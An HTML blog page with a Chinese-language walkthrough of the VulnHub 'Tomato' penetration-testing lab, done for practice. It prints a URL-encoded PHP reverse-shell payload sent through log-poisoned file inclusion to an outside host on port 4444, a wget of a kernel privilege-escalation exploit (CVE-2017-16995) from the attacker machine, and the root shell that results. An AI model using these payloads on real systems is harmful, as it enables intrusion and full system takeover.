@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://avatars.githubusercontent.com/u/154585050?v=4"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="# 靶机信息
+Tomato是vulnhub中的一台中级难度的渗透测试靶机。">
+<meta property="og:title" content="Tomato">
+<meta property="og:description" content="# 靶机信息
+Tomato是vulnhub中的一台中级难度的渗透测试靶机。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://dehua-rd.github.io/post/Tomato.html">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/154585050?v=4">
+<title>Tomato</title>
+
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">Tomato</h1>
+<div class="title-right">
+    <a href="https://dehua-rd.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/dehua-rd/dehua-rd.github.io/issues/28" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>靶机信息</h1>
+<p>Tomato是vulnhub中的一台中级难度的渗透测试靶机。</p>
+<h1>信息收集</h1>
+<h2>Nmap扫描</h2>
+<pre class="notranslate"><code class="notranslate"># Nmap 7.95 scan initiated Fri Nov 14 02:48:40 2025 as: /usr/lib/nmap/nmap --privileged -sCV -p21,80,2211,8888 -O --min-rate 10000 -oA nmapScan/details 192.168.218.217
+Nmap scan report for 192.168.218.217 (192.168.218.217)
+Host is up (0.00051s latency).
+
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.3
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Tomato
+2211/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d2:53:0a:91:8c:f1:a6:10:11:0d:9e:0f:22:f8:49:8e (RSA)
+|   256 b3:12:60:32:48:28:eb:ac:80:de:17:d7:96:77:6e:2f (ECDSA)
+|_  256 36:6f:52:ad:fe:f7:92:3e:a2:51:0f:73:06:8d:80:13 (ED25519)
+8888/tcp open  http    nginx 1.10.3 (Ubuntu)
+|_http-title: 401 Authorization Required
+|_http-server-header: nginx/1.10.3 (Ubuntu)
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=Private Property
+MAC Address: 00:0C:29:08:A8:FC (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<h2>初步信息枚举</h2>
+<p>先看优先级高的FTP端口，尝试匿名用户登录，失败，挂一个爆破然后看web端口。</p>
+<p>先看80端口，只有一个tomato~~</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/f4c02607-0f5f-4c51-9c01-428212efd03e"><img width="1919" height="975" alt="Image" src="https://github.com/user-attachments/assets/f4c02607-0f5f-4c51-9c01-428212efd03e" style="max-width: 100%; height: auto; max-height: 975px;"></a></p>
+<p>看一下源码，有类似凭据或者提示的代码，存起来，也可以直接cewl扒取页面，制作字典。</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/8536122d-854b-4a77-a2ce-6f4cea5a7dfa"><img width="1919" height="627" alt="Image" src="https://github.com/user-attachments/assets/8536122d-854b-4a77-a2ce-6f4cea5a7dfa" style="max-width: 100%; height: auto; max-height: 627px;"></a></p>
+<p>爆破一下目录，啥也没有。那就看8888端口的web服务。需要验证拿刚刚的字典没有爆出来，自己的字典也没爆出来，目录也扫不到。然后卡死了...</p>
+<p>一直卡卡卡卡卡卡卡卡，实在没招了搜一下wp，第一眼就看到是web的入口，但是web啥也没有啊，我感觉的目录字典的问题，然后我换字典扫</p>
+<pre class="notranslate"><code class="notranslate">└─$ dirsearch -u http://192.168.218.217/ -w /usr/share/wordlists/dirb/common.txt
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 4613
+
+Output File: /home/kali/RedteamStu/stageTwo/writeup/vulnhub/Tomato/reports/http_192.168.218.217/__25-11-16_21-06-58.txt
+
+Target: http://192.168.218.217/
+
+[21:06:58] Starting: 
+[21:06:59] 301 -  326B  - /antibot_image  -&gt;  http://192.168.218.217/antibot_image/
+[21:07:09] 403 -  280B  - /server-status                                    
+                                                                             
+Task Completed
+</code></pre>
+<p>真有新货，果然是字典的问题。</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/a462d859-6088-4032-a148-d11998b0e826"><img width="1919" height="963" alt="Image" src="https://github.com/user-attachments/assets/a462d859-6088-4032-a148-d11998b0e826" style="max-width: 100%; height: auto; max-height: 963px;"></a></p>
+<p>是一个目录，我习惯性的打开开发者工具翻翻看看，然后翻到phpinfo页面发现了注释</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/b2d917af-de59-4820-8f92-3fc5258f5759"><img width="1919" height="937" alt="Image" src="https://github.com/user-attachments/assets/b2d917af-de59-4820-8f92-3fc5258f5759" style="max-width: 100%; height: auto; max-height: 937px;"></a></p>
+<p>很直白的提示，可以直接用，没有什么限制</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/c84735a0-d967-42fe-b1f6-964509296361"><img width="1919" height="980" alt="Image" src="https://github.com/user-attachments/assets/c84735a0-d967-42fe-b1f6-964509296361" style="max-width: 100%; height: auto; max-height: 980px;"></a></p>
+<h1>漏洞利用</h1>
+<p>本来我感觉是让我包含服务目录相关的配置文件，但是始终找不到包含的文件，然后尝试包含一些登录凭据文件，也没成功。后面了解到，ssh的log文件在**/var/log/auth.log**，然后由于靶机中文件包含是可以执行php代码，所以可以尝试使用一些php代码作为用户名登录ssh，引发报错之后，包含log文件就会导致代码执行。</p>
+<p>我是想直接写反向shell进去的，但是里面包含太多的符号，我怎么转义都过不了，后来发现是ssh版本高了，尝试降，想了一下直接用xshell好像就可以，但是直接打反向shell，不知道是太长了还是什么，代码不会完整的进log文件，最后尝试写一句话木马，发现是可以写进去的 <strong></strong></p>
+<p>然后我尝试了非常多的反向shell最后发现只有php的socket能打回来，然后开始提权。<br>
+一定记得编码一下，然后多试错，不然会导致被系统反正很多因素过滤，导致payload出错，这是我的<code class="notranslate">http://192.168.218.217/antibot_image/antibots/info.php?image=/var/log/auth.log&amp;cmd=php+-r+%27%24sock%3dfsockopen(%22192.168.218.148%22%2c4444)%3bexec(%22%2fbin%2fsh+-i+%3c%263+%3e%263+2%3e%263%22)%3b%27</code></p>
+<h1>提权</h1>
+<p>拿到shell之后直接上linpeas扫，感觉最大可能就是内核漏洞了，但是靶机中没有编译程序，难度有提升了。</p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/92520c5c-dd9f-4e85-922b-a821981db918"><img width="1919" height="718" alt="Image" src="https://github.com/user-attachments/assets/92520c5c-dd9f-4e85-922b-a821981db918" style="max-width: 100%; height: auto; max-height: 718px;"></a></p>
+<p>优先先跟着linpeas的结果进行内核提权，脏牛给我靶机跑崩了，<strong>[<a title="CVE-2017-16995" data-hovercard-type="advisory" data-hovercard-url="/advisories/GHSA-45mv-5p9c-6w7c/hovercard" href="https://github.com/advisories/GHSA-45mv-5p9c-6w7c">CVE-2017-16995</a>] eBPF_verifier</strong>成功了。</p>
+<p>现在的问题是动态链接到 libc.so.6，而且Kali 上的 glibc 2.34，<br>
+到靶机上运行时，会去找靶机的 /lib/x86_64-linux-gnu/libc.so.6，结果版本太旧导致报错。</p>
+<p>那干脆=不动态链接了，直接静态链接，把 libc 全塞进二进制里，让程序不再依赖靶机的 glibc。</p>
+<p><code class="notranslate">gcc -static 45010.c -o 123_static</code></p>
+<pre class="notranslate"><code class="notranslate">www-data@ubuntu:/tmp$ wget http://192.168.218.148:8000/123_static
+wget http://192.168.218.148:8000/123_static
+--2025-11-17 20:48:12--  http://192.168.218.148:8000/123_static
+Connecting to 192.168.218.148:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 803272 (784K)
+Saving to: '123_static'
+
+123_static          100%[===================&gt;] 784.45K  --.-KB/s    in 0.01s   
+
+2025-11-17 20:48:12 (65.6 MB/s) - '123_static' saved [803272/803272]
+
+www-data@ubuntu:/tmp$ chmod +x 123_static
+chmod +x 123_static
+www-data@ubuntu:/tmp$ ./123_static
+./123_static
+[.] 
+[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
+[.] 
+[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
+[.] 
+[*] creating bpf map
+[*] sneaking evil bpf past the verifier
+[*] creating socketpair()
+[*] attaching bpf backdoor to socket
+[*] skbuff =&gt; ffff880035404b00
+[*] Leaking sock struct from ffff8801378ebc00
+[*] Sock-&gt;sk_rcvtimeo at offset 472
+[*] Cred structure at ffff8801379a4180
+[*] UID from cred structure: 33, matches the current: 33
+[*] hammering cred structure at ffff8801379a4180
+[*] credentials patched, launching shell...
+# id
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+# whoami
+whoami
+root
+# 
+</code></pre>
+<p>成功提权了。</p>
+<h1>反思</h1>
+<p>这个靶机可是消耗的我很多时间消化，前期的信息收集，可以更换一些其他的字典扫描，不然容易卡死，然后涉及文件包含和日志投毒的结合，和经典，但是这其中也有很多问题，payload的编码，以及服务器和系统对于payload的字符写入规则，都会导致payload无法顺利的进入日志。就算成功打进去了，也还是可能在反弹shell的时候，把你的反弹代码也给分割，解析掉，导致一直反弹不出来shell，由于是黑盒，整个过程都需要不断的试错，可能稍不注意就会放弃，最后提权的时候，我开始是直接使用search找的内核漏洞，直接打的，尝试了很多都是直接把靶机打崩了，最后才看linpeas的内核提权建议，多走了几步弯路，看似上面的wp很少，但是我花了很多时间打这台靶机，吃透靶机。</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://dehua-rd.github.io">dehua</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","dehua-rd/dehua-rd.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
